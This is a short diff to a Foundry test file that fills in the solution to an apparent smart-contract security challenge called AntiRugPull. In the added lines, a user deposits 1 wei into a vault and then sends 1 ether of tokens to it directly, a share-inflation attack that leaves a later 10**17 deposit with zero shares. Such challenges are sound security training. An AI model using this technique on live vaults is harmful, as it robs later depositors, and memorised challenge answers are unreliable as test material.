@@ -20,8 +20,13 @@ contract AntiRugPullTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        vm.startPrank(user1);
 
+        token.approve(address(instance), 1 ether);
+        instance.deposit(1);
+        token.transfer(address(instance), 1 ether);
+
+        vm.stopPrank();
         checkSuccess();
     }
 
@@ -31,7 +36,6 @@ contract AntiRugPullTest is BaseTest {
         instance.deposit(10 ** 17);
 
         uint256 shares = instance.shares(address(this));
-
         assertTrue(shares == 0, "Solution is not solving the level");
     }
 }
